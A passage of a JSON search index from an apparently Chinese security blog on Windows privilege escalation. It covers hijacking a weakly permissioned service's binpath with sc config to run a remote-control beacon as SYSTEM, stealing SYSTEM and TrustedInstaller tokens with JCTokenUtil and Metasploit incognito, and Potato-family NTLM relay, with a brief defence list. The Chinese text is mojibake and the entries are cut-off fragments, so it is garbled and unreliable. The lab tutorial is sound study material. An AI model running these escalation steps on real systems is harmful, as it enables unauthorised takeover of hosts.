å‘ç°apacheç”¨æˆ·å¯¹Cç›˜æœ‰Fæƒé™ï¼Œå³å®Œå…¨è®¿é—®\nåœ¨Cç›˜ä¸‹åˆ›å»ºä¸€ä¸ªæ¶æ„æ–‡ä»¶Program.exeè¿è¡Œï¼ˆæˆ‘åŒæ ·ä½¿ç”¨artifactï¼‰ï¼š\né‡å¯ï¼Œç­‰å¾…æœåŠ¡è‡ªåŠ¨å¯åŠ¨å³å¯ä¸Šçº¿ï¼š\næˆåŠŸè·å–systemæƒé™\né’ˆå¯¹ä¸å®‰å…¨æœåŠ¡ææƒçš„é˜²å¾¡æªæ–½ é’ˆå¯¹ä¸å®‰å…¨æœåŠ¡çš„é˜²å¾¡æªæ–½ï¼š\næ­£ç¡®é…ç½®å¯æ‰§è¡Œæ–‡ä»¶æƒé™ æ­£ç¡®é…ç½®æ³¨å†Œè¡¨æƒé™ æ£€æŸ¥æ˜¯å¦å­˜åœ¨æœªè¢«å¼•ç”¨çš„æœåŠ¡æ–‡ä»¶çš„è·¯å¾„ æ­£ç¡®é…ç½®ç¯å¢ƒå˜é‡ä¸­è·¯å¾„çš„æƒé™ ",
        "summary": "Windowsææƒ-ç³»ç»ŸæœåŠ¡ææƒ ç”¨æˆ·å®‰è£…çš„ä¸€äº›è½¯ä»¶ä¼šåœ¨æœ¬åœ°æ³¨å†Œä¸€äº›æœåŠ¡ï¼Œå¤§å¤šæ•°æœåŠ¡åœ¨è®¡ç®—æœºå¼€æœºæ—¶ä»¥ç³»ç»Ÿsystemæƒé™å¯åŠ¨ï¼Œåº”ç”¨è½¯ä»¶åœ¨æ³¨å†ŒæœåŠ¡æ—¶ä¼šåœ¨ä»¥ä¸‹è·¯å¾„åˆ›å»ºå¯¹åº”æ³¨å†Œè¡¨é¡¹ï¼š\nè®¡ç®—æœº\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services å…¶ä¸­æœåŠ¡çš„imagepathæŒ‡å‘ç³»ç»ŸæœåŠ¡å¯åŠ¨çš„äºŒè¿›åˆ¶ç¨‹åºï¼š\nè¿™é‡Œä¾¿äº§ç”Ÿä¸€ç§ææƒçš„æ€è·¯ï¼š\nç”±äºå¤§å¤šæ•°ç³»ç»ŸæœåŠ¡æ˜¯systemæƒé™å¯åŠ¨ï¼Œå¦‚æœè®©æœåŠ¡å¯åŠ¨æ—¶æ‰§è¡Œå…¶ä»–ç¨‹åºï¼Œè¯¥ç¨‹åºå°±å¯ä»¥éšç€æœåŠ¡çš„å¯åŠ¨è·å¾—ç³»ç»Ÿæƒé™ï¼Œè¾¾åˆ°ææƒç›®å½•\nè¿™ç±»ææƒå¾€å¾€æ˜¯ç”¨æˆ·é…ç½®ä¸å½“å¯¼è‡´çš„ï¼Œæ¥ä¸‹æ¥åˆ†ç±»ç»†è¯´\næœåŠ¡é…ç½®æƒé™è„†å¼± windowsçš„ç³»ç»ŸæœåŠ¡é€šè¿‡ACLæ¥æŒ‡å®šç”¨æˆ·å¯¹å…¶æ‹¥æœ‰çš„æƒé™ï¼Œå¸¸è§æƒé™å¦‚ä¸‹ï¼š\nå¦‚æœç›®æ ‡ä¸»æœºçš„ç”¨æˆ·åœ¨é…ç½®æœåŠ¡æ—¶å­˜åœ¨ç–å¿½ï¼Œä½¿ä½æƒé™ç”¨æˆ·å¯¹é«˜æƒé™ä¸‹è¿è¡Œçš„ç³»ç»ŸæœåŠ¡æ‹¥æœ‰æ›´æ”¹æœåŠ¡é…ç½®çš„æƒé™ï¼ˆSERVICE_CHANGE_CONFIGæˆ–SERVICE_ALL_ACCESSï¼‰ï¼Œå³å¯é€šè¿‡è¯¥ä½æƒé™ç”¨æˆ·ä¿®æ”¹æœåŠ¡å¯åŠ¨æ—¶çš„äºŒè¿›åˆ¶æ–‡ä»¶è·¯å¾„ï¼Œé€šè¿‡ä¿®æ”¹æœåŠ¡å¯åŠ¨æ–‡ä»¶çš„è·¯å¾„â€œ binpathâ€ï¼Œå°†å…¶æ›¿æ¢ä¸ºæ¶æ„ç¨‹åºçš„è·¯å¾„ï¼Œè¿™æ ·æœåŠ¡å¯åŠ¨æ—¶ä¾¿ä¼šè¿è¡Œæ¶æ„ç¨‹åº\nå­˜åœ¨ç¼ºé™·çš„ç³»ç»ŸæœåŠ¡å¯ä»¥é€šè¿‡AccessChkæ¥æšä¸¾ï¼š\nAccessChkå·¥å…·å¯ä»¥æšä¸¾ç›®æ ‡ä¸»æœºä¸Šå­˜åœ¨æƒé™ç¼ºé™·çš„ç³»ç»ŸæœåŠ¡ã€‚AccessChkæ˜¯å¾®è½¯å®˜æ–¹æä¾›çš„ç®¡ç†å·¥å…·ï¼Œå¸¸ç”¨æ¥æšä¸¾æˆ–æŸ¥çœ‹ç³»ç»Ÿä¸­æŒ‡å®šç”¨æˆ·ã€ç»„å¯¹ç‰¹å®šèµ„æº(åŒ…æ‹¬ä½†ä¸é™äºæ–‡ä»¶ã€æ–‡ä»¶å¤¹ã€æ³¨å†Œè¡¨ã€å…¨å±€å¯¹è±¡å’Œç³»ç»ŸæœåŠ¡ç­‰)çš„è®¿é—®æƒé™\nä½æƒé™ç”¨æˆ·å¯ä»¥æ£€æŸ¥â€œAuthenticated Usersâ€ç»„å’Œâ€œINTERACTIVEâ€ç»„å¯¹ç³»ç»ŸæœåŠ¡çš„æƒé™ï¼Œå‰è€…ä¸ºç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·ï¼ŒåŒ…å«ç³»ç»Ÿä¸­æ‰€æœ‰ä½¿ç”¨ç”¨æˆ·åã€å¯†ç ç™»å½•å¹¶é€šè¿‡èº«ä»½éªŒè¯çš„è´¦æˆ·ï¼Œä½†ä¸åŒ…æ‹¬æ¥å®¾è´¦æˆ·ï¼Œåè€…ä¸ºäº¤äº’å¼ç”¨æˆ·ç»„ï¼ŒåŒ…å«ç³»ç»Ÿä¸­æ‰€æœ‰ç›´æ¥ç™»å½•åˆ°è®¡ç®—æœºè¿›è¡Œæ“ä½œçš„ç”¨æˆ·ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™ä¸¤ä¸ªç»„ä¸ºè®¡ç®—æœºæœ¬åœ°â€œUsersâ€ç»„çš„æˆå‘˜\nç¯å¢ƒå‡†å¤‡ ç”¨adminæƒé™é…ç½®ç¯å¢ƒï¼š\nå…ˆå»ºä¸€ä¸ªæœåŠ¡ï¼Œåå­—ä¸ºYuy0ungï¼Œè¿è¡ŒCç›˜ä¸‹çš„1.exeï¼š\nsc create Yuy0ung binpath= \u0026#34;C:\\1.exe\u0026#34; åˆ›å»ºä¸€ä¸ªç”¨æˆ·æ¨¡æ‹Ÿapacheï¼š\nnet user apache Admin123456 /add ä½¿ç”¨ç”¨subinaclï¼ˆéœ€è¦è‡ªå·±ä¸‹è½½ï¼‰ç»™æœåŠ¡è®¾ç½®æƒé™ï¼š\nsubinacl /service Yuy0ung /grant=apache=F ææƒå®éªŒ åˆ‡æ¢åˆ°apcheç”¨æˆ·å¹¶ç”¨CSå®ç°è¿œæ§ï¼š\nä¸Šä¼ accesschkå¹¶æšä¸¾æ˜¯å¦å…·æœ‰apacheç”¨æˆ·å¯æ›´æ”¹çš„æœåŠ¡é…ç½®ï¼š\naccesschk.exe /accepteula -uwcqv apache * è‹¥å¾—åˆ°SERVICE_ALL_ACCESSæˆ–SERVICE_CHANGE_CONFIGå…¶ä¸­ä¹‹ä¸€ï¼Œåˆ™å…è®¸æˆ‘ä»¬é…ç½®æœåŠ¡\n**æ³¨ï¼š**é™¤äº†accesschkï¼Œwinpeasä¹Ÿå¯ä»¥æšä¸¾å‡ºå¯ä»¥ä¿®æ”¹çš„æœåŠ¡é…ç½®\næ›´æ”¹Yuy0ungæœåŠ¡çš„å¯åŠ¨æ–‡ä»¶ï¼Œæ›¿æ¢æˆæ¶æ„çš„æ–‡ä»¶ï¼ˆè¿™é‡Œæˆ‘é€‰æ‹©ä½¿ç”¨ä¸Šä¼ çš„è¿œæ§exeï¼‰ç„¶åææƒï¼š\nsc config Yuy0ung binpath= \u0026#34;C:\\Users\\apache\\Desktop\\artifact.exe\u0026#34; # æ³¨æ„=åé¢æœ‰ä¸ªç©ºæ ¼ æ‰‹åŠ¨å¯åŠ¨æœåŠ¡ï¼š\nsc start Yuy0ung å¯ä»¥çœ‹è§è¿™é‡ŒæˆåŠŸæ¥æ”¶åˆ°äº†systemæƒé™çš„beacon\næœåŠ¡æ³¨å†Œè¡¨æƒé™è„†å¼± Windowsçš„æœåŠ¡è·¯å¾„å­˜å‚¨åœ¨Windowsçš„æ³¨å†Œè¡¨ä¸­ï¼Œè€Œæ³¨å†Œè¡¨ä½¿ç”¨ACLæ¥ç®¡ç†ç”¨æˆ·å¯¹å…¶çš„è®¿é—®æƒé™ï¼Œè‹¥ACLé…ç½®ä¸å½“ï¼Œä½¿ä½æƒé™ç”¨æˆ·å¯ä»¥æ›´æ”¹æ³¨å†Œè¡¨çš„é€‰é¡¹çš„æ—¶å€™ï¼Œå°±å¯ä»¥å¯¼è‡´ææƒï¼Œå¯ä»¥å°† imagepath ä¿®æ”¹æˆæ¶æ„çš„æ–‡ä»¶ï¼Œé‡å¯å¯¼è‡´ææƒ\nç¯å¢ƒå‡†å¤‡ æ–°å»ºä¸€ä¸ªtestæœåŠ¡ï¼š\n"
    }
,
    {
        "title": "windowsææƒ-è®¿é—®ä»¤ç‰Œæ“çºµ",
        "link": "/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows%E6%8F%90%E6%9D%83/windows%E6%8F%90%E6%9D%83-%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C%E6%93%8D%E7%BA%B5/",
        "content": "windowsææƒ-è®¿é—®ä»¤ç‰Œæ“çºµ Windowsè®¿é—®ä»¤ç‰Œ ä»¤ç‰Œï¼ˆTokenï¼‰æ˜¯ç³»ç»Ÿçš„ä¸´æ—¶å¯†é’¥ï¼Œç›¸å½“äºè´¦æˆ·åå’Œå¯†ç ï¼Œç”¨æ¥å†³å®šæ˜¯å¦å…è®¸è¿™æ¬¡è¯·æ±‚å’Œåˆ¤æ–­è¿™æ¬¡è¯·æ±‚æ˜¯å±äºå“ªä¸€ä¸ªç”¨æˆ·çš„ï¼Œå®ƒå…è®¸ä½ åœ¨ä¸æä¾›å¯†ç æˆ–å…¶ä»–å‡­è¯çš„å‰æä¸‹ï¼Œè®¿é—®ç½‘ç»œå’Œç³»ç»Ÿèµ„æºï¼Œè¿™äº›ä»¤ç‰ŒæŒç»­å­˜åœ¨ç³»ç»Ÿä¸­ï¼Œé™¤éç³»ç»Ÿé‡æ–°å¯åŠ¨\nä»¤ç‰Œæœ€å¤§çš„ç‰¹ç‚¹å°±æ˜¯éšæœºæ€§ï¼Œä¸å¯é¢„æµ‹ï¼Œä¸€èˆ¬é»‘å®¢æˆ–è½¯ä»¶æ— æ³•çŒœæµ‹å‡ºæ¥ï¼Œä»¤ç‰Œæœ‰å¾ˆå¤šç§ï¼š\nè®¿é—®ä»¤ç‰Œï¼ˆAccess Tokenï¼‰è¡¨ç¤ºè®¿é—®æ§åˆ¶æ“ä½œä¸»é¢˜çš„ç³»ç»Ÿå¯¹è±¡ ä¼šè¯ä»¤ç‰Œï¼ˆSession Tokenï¼‰ï¼šæ˜¯äº¤äº’ä¼šè¯ä¸­å”¯ä¸€çš„èº«ä»½æ ‡è¯†ç¬¦ï¼Œå¯ä»¥ç†è§£ä¸ºwebä¸­çš„token å¯†ä¿ä»¤ç‰Œï¼ˆSecurity Tokenï¼‰åˆå«ä½œè®¤è¯ä»¤ç‰Œæˆ–è€…ç¡¬ä»¶ä»¤ç‰Œï¼Œæ˜¯ä¸€ç§è®¡ç®—æœºèº«ä»½æ•ˆéªŒçš„ç‰©ç†è®¾å¤‡ Windows çš„è®¿é—®ä»¤ç‰Œï¼ˆAccessTokenï¼‰ ä¸­åŒ…å«å¦‚ä¸‹å†…å®¹\nç”¨æˆ·è´¦æˆ·çš„å®‰å…¨æ ‡è¯†ç¬¦(SID) ç”¨æˆ·æ‰€å±çš„ç»„çš„SID ç”¨äºæ ‡è¯†å½“å‰ç™»é™†ä¼šè¯çš„ç™»é™†SID ç”¨æˆ·æˆ–ç”¨æˆ·ç»„æ‰€æ‹¥æœ‰çš„æƒé™åˆ—è¡¨ æ‰€æœ‰è€…SID ä¸»è¦ç»„çš„SID è®¿é—®æ§åˆ¶åˆ—è¡¨ è®¿é—®ä»¤ç‰Œçš„æ¥æº ä»¤ç‰Œæ˜¯ä¸»è¦ä»¤ç‰Œè¿˜æ˜¯æ¨¡æ‹Ÿä»¤ç‰Œ é™åˆ¶SIDçš„å¯é€‰åˆ—è¡¨ ç›®å‰çš„æ¨¡æ‹Ÿç­‰çº§ å…¶ä»–ç»Ÿè®¡çš„æ•°æ® Windows çš„è®¿é—®ä»¤ç‰Œï¼ˆAccessTokenï¼‰ æœ‰ä¸¤ç§ç±»å‹\nDelegation Tokenï¼šæˆæƒä»¤ç‰Œï¼Œä¹Ÿå«ä¸»ä»¤ç‰Œï¼Œæ”¯æŒäº¤äº’å¼ä¼šè¯ç™»å½• (ä¾‹å¦‚æœ¬åœ°ç”¨æˆ·ç›´æ¥ç™»å½•ã€è¿œç¨‹æ¡Œé¢ç™»å½•è®¿é—®)\nImpresonation Tokenï¼šæ¨¡æ‹Ÿä»¤ç‰Œï¼Œæ”¯æŒéäº¤äº’çš„ä¼šè¯ (ä¾‹å¦‚ä½¿ç”¨ net useè®¿é—®å…±äº«æ–‡ä»¶å¤¹)ã€‚\nä¸¤ç§ token åªåœ¨ç³»ç»Ÿé‡å¯åæ¸…é™¤ï¼Œå…·æœ‰ Delegation token çš„ç”¨æˆ·åœ¨æ³¨é”€åï¼Œè¯¥ Token å°†å˜æˆImpersonation tokenï¼ˆæ¨¡æ‹Ÿä»¤ç‰Œï¼‰ï¼Œä¾æ—§æœ‰æ•ˆ\nå€¼å¾—ä¸€æçš„æ˜¯ï¼Œä»¤ç‰Œçªƒå–åªèƒ½åœ¨ç‰¹æƒç”¨æˆ·ä¸Šä¸‹æ–‡ä¸­æ‰èƒ½å®Œæˆï¼Œå› ä¸ºé€šè¿‡ä»¤ç‰Œåˆ›å»ºè¿›ç¨‹ä½¿ç”¨çš„CreateProcessWithTokenWå’ŒCreateProcessAsUserAä¸¤ä¸ªwindows APIåˆ†åˆ«è¦æ±‚ç”¨æˆ·å¿…é¡»æ‹¥æœ‰SeImpersonatePrivilegeå’ŒSeAssignPrimaryTokenPrivilege/SeIncreaseQuotaPrivilegeç‰¹æƒï¼Œè€Œæ‹¥æœ‰è¿™ä¸¤ä¸ªç‰¹æƒçš„ç”¨æˆ·ä¸€èˆ¬ä¸ºç³»ç»Ÿç®¡ç†å‘˜è´¦æˆ·ã€ç½‘ç»œæœåŠ¡è´¦æˆ·ã€ç³»ç»ŸæœåŠ¡è´¦æˆ·ï¼ˆIISã€MSSQLç­‰ï¼‰\nä»¤ç‰Œçªƒå– è¯¥æ“ä½œå¾€å¾€ç”¨æ¥å°†ç®¡ç†å‘˜æƒé™æå‡è‡³SYSTEMã€TrustedInstallerç­‰æ›´é«˜æƒé™ï¼Œè‹¥æœ¬åœ°ç®¡ç†å‘˜å› ä¸ºæŸäº›ç»„ç­–ç•¥è®¾ç½®æ— æ³•è·å–æŸäº›ç‰¹æƒï¼Œå¯ä»¥é€šè¿‡ä»¤ç‰Œçªƒå–æ¥å‡å†’NT AUTHORITY\\SYSTEMçš„ä»¤ç‰Œ\nåˆ©ç”¨JCTokenUtilçªƒå–ä»¤ç‰Œ æœ¬æ¥æƒ³ä½¿ç”¨incognito.exeçš„ï¼Œä½†æ˜¯å‘ç°äº†ä¸€æ¬¾incognito.exeäºŒå¼€å·¥å…·JCTokenUtilï¼Œæ„Ÿè§‰æ›´å¥½ç”¨\né¦–å…ˆä¸Šä¼ å·¥å…·è‡³ç›®æ ‡ä¸»æœºï¼Œæ‰§è¡Œå‘½ä»¤è·å–NT AUTHORITY\\SYSTEMè´¦æˆ·çš„ä»¤ç‰Œï¼š\nTokenUtil_x64.exe ListTokens -u \u0026#34;NT AUTHORITY\\SYSTEM\u0026#34; å†è¯•è¯•ç”¨è·å–åˆ°çš„NT AUTHORITY\\SYSTEMè´¦æˆ·ä»¤ç‰Œæ‰§è¡Œå‘½ä»¤ï¼š\nTokenUtil_x64.exe Execute -p 304 -e whoami -c åˆ©ç”¨metasploitçªƒå–ä»¤ç‰Œ msfåŒæ ·å†…ç½®äº†incognitoæ¡†æ¶ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨\né¦–å…ˆä½¿ç”¨msfæ§åˆ¶ç›®æ ‡ä¸»æœºçš„ç®¡ç†å‘˜æƒé™ï¼š\nåŠ è½½incognitoï¼Œè¿›è¡Œä»¤ç‰Œçªƒå–ï¼Œç”¨æ³•å¦‚ä¸‹ï¼š\nload incognito #åŠ è½½incognito list_tokens -u #åˆ—ä¸¾tokenä»¤ç‰Œ impersonate_token \u0026#34;NT AUTHORITY\\SYSTEM\u0026#34; #æƒé™çªƒå– rev2self æˆ– drop_token #è¿”å›ä¹‹å‰çš„token é€šè¿‡ä»¤ç‰Œè·å–TrustedInstalleræƒé™ å³ä½¿è·å–äº†systemæƒé™ï¼Œä¹Ÿæ— æ³•ä¿®æ”¹windowsç³»ç»Ÿæ–‡ä»¶ï¼š\nè€Œä»Windows vistaå¼€å§‹ç³»ç»Ÿå†…ç½®äº†ä¸€ä¸ªTrustedInstallerå®‰å…¨ä¸»ä½“ï¼Œæ‹¥æœ‰ç³»ç»Ÿæ–‡ä»¶ä¿®æ”¹æƒé™ï¼Œä¸“ç”¨äºå¯¹ç³»ç»Ÿè¿›è¡Œä¿®æ”¹ã€æ›´æ–°ç­‰æ“ä½œï¼Œè€Œå…¶ä»¥ä¸€ä¸ªè´¦æˆ·çš„å½¢å¼å‡ºç°ï¼Œå³NT SERVICE\\TrustedInstallerï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¾¿å¯ä»¥å°è¯•è¿›è¡Œä»¤ç‰Œçªƒå–\nTrustedInstalleræœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªæœåŠ¡ï¼Œè¯¥æœåŠ¡å¯åŠ¨æ—¶ä¼šè¿è¡ŒC:\\Windows\\servicing\\TrustedInstaller.exeç¨‹åºï¼Œå…¶æ‹¥æœ‰è€…ä¸ºNT SERVICE\\TrustedInstallerï¼Œå¯ä»¥å€Ÿæ­¤è¿›è¡Œçªƒå–ï¼š\né¦–å…ˆå¯åŠ¨TrustedInstalleræœåŠ¡å¹¶è®°ä½tokenï¼š\nsc start TrustedInstaller æ ¹æ®PIDçªƒå–tokenï¼š\nsc stop TrustedInstaller potatoå®¶æ—ææƒ potatoå®¶æ—æ˜¯ä¸€ç§éå¸¸å¸¸ç”¨çš„ææƒæŠ€æœ¯ï¼Œé€šè¿‡æ“çºµè®¿é—®ä»¤ç‰Œï¼Œå¯å°†å·²è·å–çš„æœåŠ¡è´¦æˆ·æƒé™æå‡è‡³SYSTEMï¼Œæ€»çš„æ¥è¯´å¯ä»¥ç†è§£ä¸ºNTLMåå°„çš„åº”ç”¨\nåŸºæœ¬åŸç† SeAssignPrimaryTokenPrivilege æƒé™ Systemå¸å·ï¼ˆä¹Ÿå«LocalSystemï¼‰çš„äº¤äº’æœåŠ¡ä¸éäº¤äº’æœåŠ¡åˆå§‹ç‰¹æƒéƒ½ä¸€æ · éSystemå¸å·çš„ç‰¹æƒæ•°ä¸€æ ·ï¼ˆä¸å…·ä½“å¸å·æœ‰å…³ï¼‰ï¼Œåªæ˜¯åšä¸ºæœåŠ¡çš„ç¨‹åºå¤§éƒ¨åˆ†ç‰¹æƒåˆå§‹éƒ½æ˜¯å…³é—­çš„ï¼Œéœ€è¦æœåŠ¡è‡ªå·±æ ¹æ®éœ€è¦æ‰“å¼€ï¼ˆEnableï¼‰ Systemå¸å·çš„ç‰¹æƒæ¯”Administratorå¸å·å¤šå‡ºå‡ ä¸ªç‰¹æƒï¼šSeAssignPrimaryTokenPrivilegeï¼ŒSeLockMemoryPrivilegeï¼ŒSeTcbPrivilegeï¼ŒSeCreatePermanentPrivilegeï¼ŒSeAuditPrivilegeï¼›ä½† Administrator å¸å·å¤šäº†ä¸€ä¸ªSeRemoteShutdownPrivilege ç‰¹æƒ é™¤äº†Systemå¸å·ï¼Œå…¶ä»–å¸å·æ˜¯ä¸å¯èƒ½è¿è¡Œåœ¨TCBï¼ˆTrusted Computing Baseï¼‰ä¸­çš„ åŸºæœ¬åˆ©ç”¨æ€è·¯ åˆ©ç”¨Potatoææƒçš„æ˜¯å‰ææ˜¯æ‹¥æœ‰ SeImpersonatePrivilege æˆ–SeAssignPrimaryTokenPrivilegeæƒé™ï¼Œä»¥ä¸‹ç”¨æˆ·æ‹¥æœ‰SeImpersonatePrivilegeæƒé™ï¼š\næœ¬åœ°ç®¡ç†å‘˜è´¦æˆ·(ä¸åŒ…æ‹¬ç®¡ç†å‘˜ç»„æ™®é€šè´¦æˆ·)å’Œæœ¬åœ°æœåŠ¡è´¦æˆ· WindowsæœåŠ¡çš„ç™»é™†è´¦æˆ· Local System(NT AUTHORITY\\SYSTEM) Network Service(NT AUTHORITY\\Network Service) Local Service(NT AUTHORITY\\Local Service) æ‰€ä»¥ææƒæ–¹å‘ï¼š\nAdministrator â€”â€”\u0026gt; SYSTEM Service â€”â€”\u0026gt; SYSTEM\næœåŠ¡è´¦æˆ·åœ¨ windows æƒé™æ¨¡å‹ä¸­æœ¬èº«å°±æ‹¥æœ‰å¾ˆé«˜çš„æƒé™ï¼Œæ‰€ä»¥åœ¨å®æˆ˜åœºæ™¯ä¸­ï¼Œè‹¥æˆåŠŸæ‹¿åˆ°äº†IISç­‰æœåŠ¡çš„ WebShell æˆ–è€…é€šè¿‡ MSSQL æœåŠ¡çš„xp_cmdshell æˆåŠŸæ‰§è¡Œäº†ç³»ç»Ÿå‘½ä»¤ï¼Œæ­¤æ—¶è·å–çš„æœåŠ¡è´¦æˆ·æ‹¥æœ‰SeImpersonatePrivilege å’ŒSeAssignPrimaryTokenPrivilege ç‰¹æƒï¼Œå°±å¯ä»¥é€šè¿‡ Potato å®¶æ—æå‡è‡³ SYSTEM æƒé™\nå½“ç”¨æˆ·å…·æœ‰SeImpersonatePrivilegeç‰¹æƒï¼Œåˆ™å¯ä»¥è°ƒç”¨CreateProcessWithTokenWæ—¶ä»¥æŸä¸ªTokençš„æƒé™å¯åŠ¨æ–°è¿›ç¨‹ å½“ç”¨æˆ·å…·æœ‰SeAssignPrimaryTokenPrivilegeç‰¹æƒï¼Œåˆ™å¯ä»¥è°ƒç”¨CreateProcessAsUserWä»¥Tokenæƒé™å¯åŠ¨æ–°è¿›ç¨‹\nOrigin Potato_MS08-068 (åœŸè±†å§‹ç¥–æ¼æ´ï¼‰ SMBåè®®ä¸­ä¸€ä¸ªå…¬å¼€æŠ«éœ²çš„æ¼æ´ã€‚è¯¥æ¼æ´å¯èƒ½å…è®¸åœ¨å—å½±å“çš„ç³»ç»Ÿä¸Šæ‰§è¡Œè¿œç¨‹ä»£ç ã€‚æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´çš„æ”»å‡»è€…å¯ä»¥å®‰è£…ç¨‹åºï¼›æŸ¥çœ‹ã€æ›´æ”¹æˆ–åˆ é™¤æ•°æ®ï¼›æˆ–åˆ›å»ºå…·æœ‰å®Œå…¨ç”¨æˆ·æƒé™çš„æ–°è´¦æˆ·\næœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªç±»ä¼¼äºHTLM relay çš„æ¼æ´\nMS16-075_HOT Potato (MS08-068çš„å˜ç§) ä¸€ä¸ªå…¸å‹çš„ NTLM_RELAY åˆ©ç”¨é“¾,éœ€è¦ç­‰å¾… windows update\nåˆ©ç”¨ç¯å¢ƒï¼šDBNSæ¬ºéª—ï¼ŒWPAD å’Œ Windows update æœåŠ¡,æŒ‰ç…§Relayçš„ä¸€èˆ¬æµç¨‹ï¼Œæˆ‘ä»¬ä»ä¸‰æ–¹é¢ç€æ‰‹ï¼Œå°†æ€è·¯ä¸²èµ·æ¥ï¼Œè¾¾åˆ°æœ¬åœ°ææƒçš„æ•ˆæœ\næ€ä¹ˆå‘èµ·ntlmè¯·æ±‚ å‘èµ·ntlmè¯·æ±‚çš„æ–¹å¼: é…åˆNBNSæŠ•æ¯’æ¬ºéª—å’Œä¼ªé€ WPADä»£ç†æœåŠ¡å™¨æ‹¿åˆ°ç”¨æˆ·çš„ Net-NTML hashï¼Œæ‰€æœ‰çš„HTTPè¯·æ±‚å°†ä¼šè¢«é‡å®šå‘è‡³ \u0026ldquo;http://localhost/GETHASHESxxxxx\u0026rdquo; ï¼Œå…¶ä¸­çš„xxxxxè¡¨ç¤ºçš„æ˜¯æŸäº›å”¯ä¸€æ ‡è¯†ç¬¦ã€‚å°†ä¼šå½±å“ç›®æ ‡ä¸»æœºä¸­æ‰€æœ‰çš„ç”¨æˆ·ï¼ŒåŒ…æ‹¬ç®¡ç†å‘˜è´¦æˆ·å’Œç³»ç»Ÿè´¦æˆ·\næ‹¿åˆ°ntlm è¯·æ±‚ä¹‹åè¦åšä»€ä¹ˆ MS08-068è™½ç„¶é™åˆ¶äº†åŒå°ä¸»æœºä¹‹é—´smbåˆ°smbçš„Relayï¼Œä½†æ˜¯å¹¶æ²¡æœ‰é™åˆ¶ä»httpåˆ°smbï¼Œæˆ‘ä»¬é…ç½®é…åˆNBNSæŠ•æ¯’æ¬ºéª—å’Œä¼ªé€ WPADä»£ç†æœåŠ¡å™¨æ‹¿åˆ°çš„ntlmè¯·æ±‚è¯´httpçš„å½¢å¼ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥relay åˆ°æœ¬æœºçš„smbã€‚\næœåŠ¡ç«¯æ˜¯å¦è¦æ±‚ç­¾å æˆ‘ä»¬Relayåˆ°çš„æœåŠ¡ç«¯åè®®æ˜¯smbï¼Œé™¤éæ˜¯åŸŸå†…çš„åŸŸæ§ï¼Œä¸ç„¶åœ¨å·¥ä½œç»„ç¯èŠ‚åº•ä¸‹ï¼Œæˆ–è€…åŸŸå†…çš„åŸŸæˆå‘˜æœºå™¨ï¼Œéƒ½æ˜¯ä¸è¦æ±‚ç­¾åçš„ã€‚\nghost potato å› ä¸ºms08-068è¡¥ä¸å­˜åœ¨æ¼æ´å¯¼è‡´ï¼Œè¡¥ä¸åçš„ntlmï¼š\nå½“æˆ‘ä»¬å­˜åœ¨ä¸¤ä¸ªä¸»æœºè¿›è¡ŒSMBé€šä¿¡æ—¶ï¼ŒAå‘Bå‘é€äº†type1è¯·æ±‚ï¼ŒåŒæ—¶ä»–å°†è‡ªå·±çš„pszTargetNameè®¾ç½®ä¸ºcifs/B, å½“æ‹¿åˆ°type2çš„challengeæ—¶ï¼Œå‘lsassè¿›ç¨‹ä¸­å†™å…¥ç¼“å­˜ -\u0026gt; (Challenge,cifs/B)ã€‚ è€ŒåAå‘Bå‘é€type3ï¼ŒBæ”¶åˆ°responseåï¼Œä¼šåˆ°lsassä¸­å»å¯»æ‰¾æ˜¯å¦å­˜åœ¨ç¼“å­˜(Challenge,cifs/B), å› ä¸ºåªæœ‰Aä¸»æœºå†™å…¥äº†ç¼“å­˜ï¼Œæ‰€ä»¥å¦‚æœAå’ŒBä¸æ˜¯åŒä¸€ä¸ªä¸»æœºï¼Œé‚£ä¹ˆè‚¯å®šBä¸»æœºä¸å­˜åœ¨ç¼“å­˜ï¼Œè®¤è¯æˆåŠŸã€‚\nç„¶è€Œï¼Œè¿™ä¸ªç¼“å­˜åªæœ‰300sçš„æ—¶æ•ˆï¼Œ300såä¼šè¢«æ¸…ç©ºï¼Œé‚£ä¹ˆæ­¤æ—¶å³ä¾¿æ˜¯ntlm relayåˆ°æœ¬æœºï¼Œè¡¥ä¸ä¹Ÿä¸èµ·ä½œç”¨\nRotten Potato ms16-075çš„ä¸€ä¸ªå˜ç§ï¼Œæ˜¯ä¸€ä¸ªæœ¬åœ°ææƒæ‰‹æ³•ï¼Œä¸èƒ½ç”¨äºåŸŸç”¨æˆ·ææƒï¼Œå¯ä»¥å°†æƒé™æå‡è‡³NT AUTHORITY \\ SYSTEM\né€šè¿‡ DCOM call æ¥ä½¿æœåŠ¡å‘æ”»å‡»è€…ç›‘å¬çš„ç«¯å£å‘èµ·è¿æ¥å¹¶è¿›è¡Œ NTLM è®¤è¯,éœ€è¦SelmpersonatePrivilegeæƒé™\næ­¤æ—¶ï¼Œå¦‚æœè¦æ¨¡æ‹Ÿä»¤ç‰Œï¼Œæœ€å¥½ä»¥å…·æœ‰SeImpersonateç‰¹æƒï¼ˆæˆ–ç­‰æ•ˆç‰¹æƒï¼‰çš„å¸æˆ·è¿è¡Œã€‚å¹¸è¿çš„æ˜¯ï¼Œè¿™åŒ…æ‹¬Windowsä¸­çš„è®¸å¤šæœåŠ¡å¸æˆ·ï¼Œæ¸—é€æµ‹è¯•äººå‘˜é€šå¸¸æœ€ç»ˆä»¥è¿™äº›å¸æˆ·è¿è¡Œã€‚ä¾‹å¦‚ï¼ŒIISå’ŒSQL Serverå¸æˆ·\nå¤§è‡´åŸç†å¦‚ä¸‹ï¼š\nï¼ˆ1ï¼‰æ¬ºéª—â€œNT AUTHORITY\\SYSTEMâ€å¸æˆ·é€šè¿‡ NTLM å¯¹æˆ‘ä»¬æ§åˆ¶çš„ TCP ç«¯ç‚¹è¿›è¡Œèº«ä»½éªŒè¯ã€‚ 